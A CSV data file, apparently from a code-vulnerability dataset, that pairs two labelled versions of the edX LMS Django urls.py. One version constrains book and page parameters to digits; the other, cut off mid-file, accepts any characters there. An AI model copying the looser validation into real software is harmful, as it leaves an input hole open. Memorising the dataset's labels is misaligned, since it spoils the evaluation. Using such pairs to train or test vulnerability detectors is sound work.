,Unnamed: 0,id,code,label
34,34,5fad9ccca43cdfb565b3f80914f998afa7f2fa78,"lms/urls.py/n/nfrom django.conf import settings
from django.conf.urls import patterns, include, url
from django.contrib import admin
from django.conf.urls.static import static

# Not used, the work is done in the imported module.
from . import one_time_startup      # pylint: disable=W0611

import django.contrib.auth.views

# Uncomment the next two lines to enable the admin:
if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'):
    admin.autodiscover()

urlpatterns = ('',  # nopep8
    # certificate view

    url(r'^update_certificate$', 'certificates.views.update_certificate'),
    url(r'^$', 'branding.views.index', name=""root""),   # Main marketing page, or redirect to courseware
    url(r'^dashboard$', 'student.views.dashboard', name=""dashboard""),
    url(r'^login$', 'student.views.signin_user', name=""signin_user""),
    url(r'^register$', 'student.views.register_user', name=""register_user""),

    url(r'^admin_dashboard$', 'dashboard.views.dashboard'),

    url(r'^change_email$', 'student.views.change_email_request', name=""change_email""),
    url(r'^email_confirm/(?P<key>[^/]*)$', 'student.views.confirm_email_change'),
    url(r'^change_name$', 'student.views.change_name_request', name=""change_name""),
    url(r'^accept_name_change$', 'student.views.accept_name_change'),
    url(r'^reject_name_change$', 'student.views.reject_name_change'),
    url(r'^pending_name_changes$', 'student.views.pending_name_changes'),
    url(r'^event$', 'track.views.user_track'),
    url(r'^t/(?P<template>[^/]*)$', 'static_template_view.views.index'),   # TODO: Is this used anymore? What is STATIC_GRAB?

    url(r'^accounts/login$', 'student.views.accounts_login', name=""accounts_login""),

    url(r'^login_ajax$', 'student.views.login_user', name=""login""),
    url(r'^login_ajax/(?P<error>[^/]*)$', 'student.views.login_user'),
    url(r'^logout$', 'student.views.logout_user', name='logout'),
    url(r'^create_account$', 'student.views.create_account', name='create_account'),
    url(r'^activate/(?P<key>[^/]*)$', 'student.views.activate_account', name=""activate""),

    url(r'^begin_exam_registration/(?P<course_id>[^/]+/[^/]+/[^/]+)$', 'student.views.begin_exam_registration', name=""begin_exam_registration""),
    url(r'^create_exam_registration$', 'student.views.create_exam_registration'),

    url(r'^password_reset/$', 'student.views.password_reset', name='password_reset'),
    ## Obsolete Django views for password resets
    ## TODO: Replace with Mako-ized views
    url(r'^password_change/$', django.contrib.auth.views.password_change,
        name='auth_password_change'),
    url(r'^password_change_done/$', django.contrib.auth.views.password_change_done,
        name='auth_password_change_done'),
    url(r'^password_reset_confirm/(?P<uidb36>[0-9A-Za-z]+)-(?P<token>.+)/$',
        'student.views.password_reset_confirm_wrapper',
        name='auth_password_reset_confirm'),
    url(r'^password_reset_complete/$', django.contrib.auth.views.password_reset_complete,
        name='auth_password_reset_complete'),
    url(r'^password_reset_done/$', django.contrib.auth.views.password_reset_done,
        name='auth_password_reset_done'),

    url(r'^heartbeat$', include('heartbeat.urls')),
)

# University profiles only make sense in the default edX context
if not settings.MITX_FEATURES[""USE_CUSTOM_THEME""]:
    urlpatterns += (
        ##
        ## Only universities without courses should be included here.  If
        ## courses exist, the dynamic profile rule below should win.
        ##
        url(r'^(?i)university_profile/WellesleyX$', 'courseware.views.static_university_profile',
            name=""static_university_profile"", kwargs={'org_id': 'WellesleyX'}),
        url(r'^(?i)university_profile/McGillX$', 'courseware.views.static_university_profile',
            name=""static_university_profile"", kwargs={'org_id': 'McGillX'}),
        url(r'^(?i)university_profile/TorontoX$', 'courseware.views.static_university_profile',
            name=""static_university_profile"", kwargs={'org_id': 'TorontoX'}),
        url(r'^(?i)university_profile/RiceX$', 'courseware.views.static_university_profile',
            name=""static_university_profile"", kwargs={'org_id': 'RiceX'}),
        url(r'^(?i)university_profile/ANUx$', 'courseware.views.static_university_profile',
            name=""static_university_profile"", kwargs={'org_id': 'ANUx'}),
        url(r'^(?i)university_profile/EPFLx$', 'courseware.views.static_university_profile',
            name=""static_university_profile"", kwargs={'org_id': 'EPFLx'}),

        url(r'^university_profile/(?P<org_id>[^/]+)$', 'courseware.views.university_profile',
            name=""university_profile""),
    )

#Semi-static views (these need to be rendered and have the login bar, but don't change)
urlpatterns += (
    url(r'^404$', 'static_template_view.views.render',
        {'template': '404.html'}, name=""404""),
)

# Semi-static views only used by edX, not by themes
if not settings.MITX_FEATURES[""USE_CUSTOM_THEME""]:
    urlpatterns += (
        url(r'^jobs$', 'static_template_view.views.render',
            {'template': 'jobs.html'}, name=""jobs""),
        url(r'^press$', 'student.views.press', name=""press""),
        url(r'^media-kit$', 'static_template_view.views.render',
            {'template': 'media-kit.html'}, name=""media-kit""),
        url(r'^faq$', 'static_template_view.views.render',
            {'template': 'faq.html'}, name=""faq_edx""),
        url(r'^help$', 'static_template_view.views.render',
            {'template': 'help.html'}, name=""help_edx""),

        # TODO: (bridger) The copyright has been removed until it is updated for edX
        # url(r'^copyright$', 'static_template_view.views.render',
        #     {'template': 'copyright.html'}, name=""copyright""),

        #Press releases
        url(r'^press/([_a-zA-Z0-9-]+)$', 'static_template_view.views.render_press_release', name='press_release'),

        # Favicon
        (r'^favicon\.ico$', 'django.views.generic.simple.redirect_to', {'url': '/static/images/favicon.ico'}),

        url(r'^submit_feedback$', 'util.views.submit_feedback'),

    )

# Only enable URLs for those marketing links actually enabled in the
# settings. Disable URLs by marking them as None.
for key, value in settings.MKTG_URL_LINK_MAP.items():
    # Skip disabled URLs
    if value is None:
        continue

    # These urls are enabled separately
    if key == ""ROOT"" or key == ""COURSES"" or key == ""FAQ"":
        continue

    # Make the assumptions that the templates are all in the same dir
    # and that they all match the name of the key (plus extension)
    template = ""%s.html"" % key.lower()

    # To allow theme templates to inherit from default templates,
    # prepend a standard prefix
    if settings.MITX_FEATURES[""USE_CUSTOM_THEME""]:
        template = ""theme-"" + template

    # Make the assumption that the URL we want is the lowercased
    # version of the map key
    urlpatterns += (url(r'^%s' % key.lower(),
                        'static_template_view.views.render',
                        {'template': template}, name=value),)


if settings.PERFSTATS:
    urlpatterns += (url(r'^reprofile$', 'perfstats.views.end_profile'),)

# Multicourse wiki (Note: wiki urls must be above the courseware ones because of
# the custom tab catch-all)
if settings.WIKI_ENABLED:
    from wiki.urls import get_pattern as wiki_pattern
    from django_notify.urls import get_pattern as notify_pattern

    # Note that some of these urls are repeated in course_wiki.course_nav. Make sure to update
    # them together.
    urlpatterns += (
        # First we include views from course_wiki that we use to override the default views.
        # They come first in the urlpatterns so they get resolved first
        url('^wiki/create-root/$', 'course_wiki.views.root_create', name='root_create'),
        url(r'^wiki/', include(wiki_pattern())),
        url(r'^notify/', include(notify_pattern())),

        # These urls are for viewing the wiki in the context of a course. They should
        # never be returned by a reverse() so they come after the other url patterns
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/course_wiki/?$',
            'course_wiki.views.course_wiki_redirect', name=""course_wiki""),
        url(r'^courses/(?:[^/]+/[^/]+/[^/]+)/wiki/', include(wiki_pattern())),
    )


if settings.COURSEWARE_ENABLED:
    urlpatterns += (
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/jump_to/(?P<location>.*)$',
            'courseware.views.jump_to', name=""jump_to""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/modx/(?P<location>.*?)/(?P<dispatch>[^/]*)$',
            'courseware.module_render.modx_dispatch',
            name='modx_dispatch'),


        # Software Licenses

        # TODO: for now, this is the endpoint of an ajax replay
        # service that retrieve and assigns license numbers for
        # software assigned to a course. The numbers have to be loaded
        # into the database.
        url(r'^software-licenses$', 'licenses.views.user_software_license', name=""user_software_license""),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/xqueue/(?P<userid>[^/]*)/(?P<mod_id>.*?)/(?P<dispatch>[^/]*)$',
            'courseware.module_render.xqueue_callback',
            name='xqueue_callback'),
        url(r'^change_setting$', 'student.views.change_setting',
            name='change_setting'),

        # TODO: These views need to be updated before they work
        url(r'^calculate$', 'util.views.calculate'),
        # TODO: We should probably remove the circuit package. I believe it was only used in the old way of saving wiki circuits for the wiki
        # url(r'^edit_circuit/(?P<circuit>[^/]*)$', 'circuit.views.edit_circuit'),
        # url(r'^save_circuit/(?P<circuit>[^/]*)$', 'circuit.views.save_circuit'),

        url(r'^courses/?$', 'branding.views.courses', name=""courses""),
        url(r'^change_enrollment$',
            'student.views.change_enrollment', name=""change_enrollment""),

        #About the course
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/about$',
            'courseware.views.course_about', name=""about_course""),
        #View for mktg site (kept for backwards compatibility TODO - remove before merge to master)
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/mktg-about$',
            'courseware.views.mktg_course_about', name=""mktg_about_course""),
        #View for mktg site
        url(r'^mktg/(?P<course_id>.*)$',
            'courseware.views.mktg_course_about', name=""mktg_about_course""),



        #Inside the course
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',
            'courseware.views.course_info', name=""course_root""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/info$',
            'courseware.views.course_info', name=""info""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$',
            'courseware.views.syllabus', name=""syllabus""),   # TODO arjun remove when custom tabs in place, see courseware/courses.py
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\d+)/$',
            'staticbook.views.index', name=""book""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\d+)/(?P<page>\d+)$',
            'staticbook.views.index'),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\d+)/$',
            'staticbook.views.pdf_index', name=""pdf_book""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\d+)/(?P<page>\d+)$',
            'staticbook.views.pdf_index', name=""pdf_book""),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\d+)/chapter/(?P<chapter>\d+)/$',
            'staticbook.views.pdf_index', name=""pdf_book""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\d+)/chapter/(?P<chapter>\d+)/(?P<page>\d+)$',
            'staticbook.views.pdf_index', name=""pdf_book""),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\d+)/$',
            'staticbook.views.html_index', name=""html_book""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\d+)/chapter/(?P<chapter>\d+)/$',
            'staticbook.views.html_index', name=""html_book""),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$',
            'courseware.views.index', name=""courseware""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/$',
            'courseware.views.index', name=""courseware_chapter""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/$',
            'courseware.views.index', name=""courseware_section""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/(?P<position>[^/]*)/?$',
            'courseware.views.index', name=""courseware_position""),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress$',
            'courseware.views.progress', name=""progress""),
        # Takes optional student_id for instructor use--shows profile as that student sees it.
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress/(?P<student_id>[^/]*)/$',
            'courseware.views.progress', name=""student_progress""),

        # For the instructor
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/instructor$',
            'instructor.views.instructor_dashboard', name=""instructor_dashboard""),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/gradebook$',
            'instructor.views.gradebook', name='gradebook'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/grade_summary$',
            'instructor.views.grade_summary', name='grade_summary'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading$',
            'open_ended_grading.views.staff_grading', name='staff_grading'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_next$',
            'open_ended_grading.staff_grading_service.get_next', name='staff_grading_get_next'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$',
            'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$',
            'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_problem_list$',
            'open_ended_grading.staff_grading_service.get_problem_list', name='staff_grading_get_problem_list'),

        # Open Ended problem list
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_problems$',
            'open_ended_grading.views.student_problem_list', name='open_ended_problems'),

        # Open Ended flagged problem list
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems$',
            'open_ended_grading.views.flagged_problem_list', name='open_ended_flagged_problems'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems/take_action_on_flags$',
            'open_ended_grading.views.take_action_on_flags', name='open_ended_flagged_problems_take_action'),

        # Cohorts management
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts$',
            'course_groups.views.list_cohorts', name=""cohorts""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/add$',
            'course_groups.views.add_cohort',
            name=""add_cohort""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)$',
            'course_groups.views.users_in_cohort',
            name=""list_cohort""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/add$',
            'course_groups.views.add_users_to_cohort',
            name=""add_to_cohort""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/delete$',
            'course_groups.views.remove_user_from_cohort',
            name=""remove_from_cohort""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/debug$',
            'course_groups.views.debug_cohort_mgmt',
            name=""debug_cohort_mgmt""),

        # Open Ended Notifications
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_notifications$',
            'open_ended_grading.views.combined_notifications', name='open_ended_notifications'),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/peer_grading$',
            'open_ended_grading.views.peer_grading', name='peer_grading'),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes$', 'notes.views.notes', name='notes'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes/', include('notes.urls')),

    )

    # allow course staff to change to student view of courseware
    if settings.MITX_FEATURES.get('ENABLE_MASQUERADE'):
        urlpatterns += (
            url(r'^masquerade/(?P<marg>.*)$', 'courseware.masquerade.handle_ajax', name=""masquerade-switch""),
        )

    # discussion forums live within courseware, so courseware must be enabled first
    if settings.MITX_FEATURES.get('ENABLE_DISCUSSION_SERVICE'):
        urlpatterns += (
            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/news$',
                'courseware.views.news', name=""news""),
            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/discussion/',
                include('django_comment_client.urls'))
        )
    urlpatterns += (
        # This MUST be the last view in the courseware--it's a catch-all for custom tabs.
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/(?P<tab_slug>[^/]+)/$',
        'courseware.views.static_tab', name=""static_tab""),
    )

    if settings.MITX_FEATURES.get('ENABLE_STUDENT_HISTORY_VIEW'):
        urlpatterns += (
            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/submission_history/(?P<student_username>[^/]*)/(?P<location>.*?)$',
                'courseware.views.submission_history',
                name='submission_history'),
        )


if settings.ENABLE_JASMINE:
    urlpatterns += (url(r'^_jasmine/', include('django_jasmine.urls')),)

if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'):
    ## Jasmine and admin
    urlpatterns += (url(r'^admin/', include(admin.site.urls)),)

if settings.MITX_FEATURES.get('AUTH_USE_OPENID'):
    urlpatterns += (
        url(r'^openid/login/$', 'django_openid_auth.views.login_begin', name='openid-login'),
        url(r'^openid/complete/$', 'external_auth.views.openid_login_complete', name='openid-complete'),
        url(r'^openid/logo.gif$', 'django_openid_auth.views.logo', name='openid-logo'),
    )

if settings.MITX_FEATURES.get('AUTH_USE_SHIB'):
    urlpatterns += (
        url(r'^shib-login/$', 'external_auth.views.shib_login', name='shib-login'),
    )

if settings.MITX_FEATURES.get('RESTRICT_ENROLL_BY_REG_METHOD'):
    urlpatterns += (
        url(r'^course_specific_login/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',
            'external_auth.views.course_specific_login', name='course-specific-login'),
        url(r'^course_specific_register/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',
            'external_auth.views.course_specific_register', name='course-specific-register'),

    )


if settings.MITX_FEATURES.get('AUTH_USE_OPENID_PROVIDER'):
    urlpatterns += (
        url(r'^openid/provider/login/$', 'external_auth.views.provider_login', name='openid-provider-login'),
        url(r'^openid/provider/login/(?:.+)$', 'external_auth.views.provider_identity', name='openid-provider-login-identity'),
        url(r'^openid/provider/identity/$', 'external_auth.views.provider_identity', name='openid-provider-identity'),
        url(r'^openid/provider/xrds/$', 'external_auth.views.provider_xrds', name='openid-provider-xrds')
    )

if settings.MITX_FEATURES.get('ENABLE_PEARSON_LOGIN', False):
    urlpatterns += url(r'^testcenter/login$', 'external_auth.views.test_center_login'),

if settings.MITX_FEATURES.get('ENABLE_LMS_MIGRATION'):
    urlpatterns += (
        url(r'^migrate/modules$', 'lms_migration.migrate.manage_modulestores'),
        url(r'^migrate/reload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.manage_modulestores'),
        url(r'^migrate/reload/(?P<reload_dir>[^/]+)/(?P<commit_id>[^/]+)$', 'lms_migration.migrate.manage_modulestores'),
        url(r'^gitreload$', 'lms_migration.migrate.gitreload'),
        url(r'^gitreload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.gitreload'),
    )

if settings.MITX_FEATURES.get('ENABLE_SQL_TRACKING_LOGS'):
    urlpatterns += (
        url(r'^event_logs$', 'track.views.view_tracking_log'),
        url(r'^event_logs/(?P<args>.+)$', 'track.views.view_tracking_log'),
    )

if settings.MITX_FEATURES.get('ENABLE_SERVICE_STATUS'):
    urlpatterns += (
        url(r'^status/', include('service_status.urls')),
    )

if settings.MITX_FEATURES.get('ENABLE_INSTRUCTOR_BACKGROUND_TASKS'):
    urlpatterns += (
        url(r'^instructor_task_status/$', 'instructor_task.views.instructor_task_status', name='instructor_task_status'),
    )

if settings.MITX_FEATURES.get('RUN_AS_ANALYTICS_SERVER_ENABLED'):
    urlpatterns += (
        url(r'^edinsights_service/', include('edinsights.core.urls')),
    )
    import edinsights.core.registry

# FoldIt views
urlpatterns += (
    # The path is hardcoded into their app...
    url(r'^comm/foldit_ops', 'foldit.views.foldit_ops', name=""foldit_ops""),
)

if settings.MITX_FEATURES.get('ENABLE_DEBUG_RUN_PYTHON'):
    urlpatterns += (
        url(r'^debug/run_python', 'debug.views.run_python'),
    )

# Crowdsourced hinting instructor manager.
if settings.MITX_FEATURES.get('ENABLE_HINTER_INSTRUCTOR_VIEW'):
    urlpatterns += (
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/hint_manager$',
            'instructor.hint_manager.hint_manager', name=""hint_manager""),
    )

urlpatterns = patterns(*urlpatterns)

if settings.DEBUG:
    urlpatterns += static(settings.STATIC_URL, document_root=settings.STATIC_ROOT)

#Custom error pages
handler404 = 'static_template_view.views.render_404'
handler500 = 'static_template_view.views.render_500'
/n/n/n",0
35,35,5fad9ccca43cdfb565b3f80914f998afa7f2fa78,"/lms/urls.py/n/nfrom django.conf import settings
from django.conf.urls import patterns, include, url
from django.contrib import admin
from django.conf.urls.static import static

# Not used, the work is done in the imported module.
from . import one_time_startup      # pylint: disable=W0611

import django.contrib.auth.views

# Uncomment the next two lines to enable the admin:
if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'):
    admin.autodiscover()

urlpatterns = ('',  # nopep8
    # certificate view

    url(r'^update_certificate$', 'certificates.views.update_certificate'),
    url(r'^$', 'branding.views.index', name=""root""),   # Main marketing page, or redirect to courseware
    url(r'^dashboard$', 'student.views.dashboard', name=""dashboard""),
    url(r'^login$', 'student.views.signin_user', name=""signin_user""),
    url(r'^register$', 'student.views.register_user', name=""register_user""),

    url(r'^admin_dashboard$', 'dashboard.views.dashboard'),

    url(r'^change_email$', 'student.views.change_email_request', name=""change_email""),
    url(r'^email_confirm/(?P<key>[^/]*)$', 'student.views.confirm_email_change'),
    url(r'^change_name$', 'student.views.change_name_request', name=""change_name""),
    url(r'^accept_name_change$', 'student.views.accept_name_change'),
    url(r'^reject_name_change$', 'student.views.reject_name_change'),
    url(r'^pending_name_changes$', 'student.views.pending_name_changes'),
    url(r'^event$', 'track.views.user_track'),
    url(r'^t/(?P<template>[^/]*)$', 'static_template_view.views.index'),   # TODO: Is this used anymore? What is STATIC_GRAB?

    url(r'^accounts/login$', 'student.views.accounts_login', name=""accounts_login""),

    url(r'^login_ajax$', 'student.views.login_user', name=""login""),
    url(r'^login_ajax/(?P<error>[^/]*)$', 'student.views.login_user'),
    url(r'^logout$', 'student.views.logout_user', name='logout'),
    url(r'^create_account$', 'student.views.create_account', name='create_account'),
    url(r'^activate/(?P<key>[^/]*)$', 'student.views.activate_account', name=""activate""),

    url(r'^begin_exam_registration/(?P<course_id>[^/]+/[^/]+/[^/]+)$', 'student.views.begin_exam_registration', name=""begin_exam_registration""),
    url(r'^create_exam_registration$', 'student.views.create_exam_registration'),

    url(r'^password_reset/$', 'student.views.password_reset', name='password_reset'),
    ## Obsolete Django views for password resets
    ## TODO: Replace with Mako-ized views
    url(r'^password_change/$', django.contrib.auth.views.password_change,
        name='auth_password_change'),
    url(r'^password_change_done/$', django.contrib.auth.views.password_change_done,
        name='auth_password_change_done'),
    url(r'^password_reset_confirm/(?P<uidb36>[0-9A-Za-z]+)-(?P<token>.+)/$',
        'student.views.password_reset_confirm_wrapper',
        name='auth_password_reset_confirm'),
    url(r'^password_reset_complete/$', django.contrib.auth.views.password_reset_complete,
        name='auth_password_reset_complete'),
    url(r'^password_reset_done/$', django.contrib.auth.views.password_reset_done,
        name='auth_password_reset_done'),

    url(r'^heartbeat$', include('heartbeat.urls')),
)

# University profiles only make sense in the default edX context
if not settings.MITX_FEATURES[""USE_CUSTOM_THEME""]:
    urlpatterns += (
        ##
        ## Only universities without courses should be included here.  If
        ## courses exist, the dynamic profile rule below should win.
        ##
        url(r'^(?i)university_profile/WellesleyX$', 'courseware.views.static_university_profile',
            name=""static_university_profile"", kwargs={'org_id': 'WellesleyX'}),
        url(r'^(?i)university_profile/McGillX$', 'courseware.views.static_university_profile',
            name=""static_university_profile"", kwargs={'org_id': 'McGillX'}),
        url(r'^(?i)university_profile/TorontoX$', 'courseware.views.static_university_profile',
            name=""static_university_profile"", kwargs={'org_id': 'TorontoX'}),
        url(r'^(?i)university_profile/RiceX$', 'courseware.views.static_university_profile',
            name=""static_university_profile"", kwargs={'org_id': 'RiceX'}),
        url(r'^(?i)university_profile/ANUx$', 'courseware.views.static_university_profile',
            name=""static_university_profile"", kwargs={'org_id': 'ANUx'}),
        url(r'^(?i)university_profile/EPFLx$', 'courseware.views.static_university_profile',
            name=""static_university_profile"", kwargs={'org_id': 'EPFLx'}),

        url(r'^university_profile/(?P<org_id>[^/]+)$', 'courseware.views.university_profile',
            name=""university_profile""),
    )

#Semi-static views (these need to be rendered and have the login bar, but don't change)
urlpatterns += (
    url(r'^404$', 'static_template_view.views.render',
        {'template': '404.html'}, name=""404""),
)

# Semi-static views only used by edX, not by themes
if not settings.MITX_FEATURES[""USE_CUSTOM_THEME""]:
    urlpatterns += (
        url(r'^jobs$', 'static_template_view.views.render',
            {'template': 'jobs.html'}, name=""jobs""),
        url(r'^press$', 'student.views.press', name=""press""),
        url(r'^media-kit$', 'static_template_view.views.render',
            {'template': 'media-kit.html'}, name=""media-kit""),
        url(r'^faq$', 'static_template_view.views.render',
            {'template': 'faq.html'}, name=""faq_edx""),
        url(r'^help$', 'static_template_view.views.render',
            {'template': 'help.html'}, name=""help_edx""),

        # TODO: (bridger) The copyright has been removed until it is updated for edX
        # url(r'^copyright$', 'static_template_view.views.render',
        #     {'template': 'copyright.html'}, name=""copyright""),

        #Press releases
        url(r'^press/([_a-zA-Z0-9-]+)$', 'static_template_view.views.render_press_release', name='press_release'),

        # Favicon
        (r'^favicon\.ico$', 'django.views.generic.simple.redirect_to', {'url': '/static/images/favicon.ico'}),

        url(r'^submit_feedback$', 'util.views.submit_feedback'),

    )

# Only enable URLs for those marketing links actually enabled in the
# settings. Disable URLs by marking them as None.
for key, value in settings.MKTG_URL_LINK_MAP.items():
    # Skip disabled URLs
    if value is None:
        continue

    # These urls are enabled separately
    if key == ""ROOT"" or key == ""COURSES"" or key == ""FAQ"":
        continue

    # Make the assumptions that the templates are all in the same dir
    # and that they all match the name of the key (plus extension)
    template = ""%s.html"" % key.lower()

    # To allow theme templates to inherit from default templates,
    # prepend a standard prefix
    if settings.MITX_FEATURES[""USE_CUSTOM_THEME""]:
        template = ""theme-"" + template

    # Make the assumption that the URL we want is the lowercased
    # version of the map key
    urlpatterns += (url(r'^%s' % key.lower(),
                        'static_template_view.views.render',
                        {'template': template}, name=value),)


if settings.PERFSTATS:
    urlpatterns += (url(r'^reprofile$', 'perfstats.views.end_profile'),)

# Multicourse wiki (Note: wiki urls must be above the courseware ones because of
# the custom tab catch-all)
if settings.WIKI_ENABLED:
    from wiki.urls import get_pattern as wiki_pattern
    from django_notify.urls import get_pattern as notify_pattern

    # Note that some of these urls are repeated in course_wiki.course_nav. Make sure to update
    # them together.
    urlpatterns += (
        # First we include views from course_wiki that we use to override the default views.
        # They come first in the urlpatterns so they get resolved first
        url('^wiki/create-root/$', 'course_wiki.views.root_create', name='root_create'),
        url(r'^wiki/', include(wiki_pattern())),
        url(r'^notify/', include(notify_pattern())),

        # These urls are for viewing the wiki in the context of a course. They should
        # never be returned by a reverse() so they come after the other url patterns
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/course_wiki/?$',
            'course_wiki.views.course_wiki_redirect', name=""course_wiki""),
        url(r'^courses/(?:[^/]+/[^/]+/[^/]+)/wiki/', include(wiki_pattern())),
    )


if settings.COURSEWARE_ENABLED:
    urlpatterns += (
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/jump_to/(?P<location>.*)$',
            'courseware.views.jump_to', name=""jump_to""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/modx/(?P<location>.*?)/(?P<dispatch>[^/]*)$',
            'courseware.module_render.modx_dispatch',
            name='modx_dispatch'),


        # Software Licenses

        # TODO: for now, this is the endpoint of an ajax replay
        # service that retrieve and assigns license numbers for
        # software assigned to a course. The numbers have to be loaded
        # into the database.
        url(r'^software-licenses$', 'licenses.views.user_software_license', name=""user_software_license""),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/xqueue/(?P<userid>[^/]*)/(?P<mod_id>.*?)/(?P<dispatch>[^/]*)$',
            'courseware.module_render.xqueue_callback',
            name='xqueue_callback'),
        url(r'^change_setting$', 'student.views.change_setting',
            name='change_setting'),

        # TODO: These views need to be updated before they work
        url(r'^calculate$', 'util.views.calculate'),
        # TODO: We should probably remove the circuit package. I believe it was only used in the old way of saving wiki circuits for the wiki
        # url(r'^edit_circuit/(?P<circuit>[^/]*)$', 'circuit.views.edit_circuit'),
        # url(r'^save_circuit/(?P<circuit>[^/]*)$', 'circuit.views.save_circuit'),

        url(r'^courses/?$', 'branding.views.courses', name=""courses""),
        url(r'^change_enrollment$',
            'student.views.change_enrollment', name=""change_enrollment""),

        #About the course
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/about$',
            'courseware.views.course_about', name=""about_course""),
        #View for mktg site (kept for backwards compatibility TODO - remove before merge to master)
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/mktg-about$',
            'courseware.views.mktg_course_about', name=""mktg_about_course""),
        #View for mktg site
        url(r'^mktg/(?P<course_id>.*)$',
            'courseware.views.mktg_course_about', name=""mktg_about_course""),



        #Inside the course
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',
            'courseware.views.course_info', name=""course_root""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/info$',
            'courseware.views.course_info', name=""info""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$',
            'courseware.views.syllabus', name=""syllabus""),   # TODO arjun remove when custom tabs in place, see courseware/courses.py
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$',
            'staticbook.views.index', name=""book""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',
            'staticbook.views.index'),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$',
            'staticbook.views.pdf_index', name=""pdf_book""),
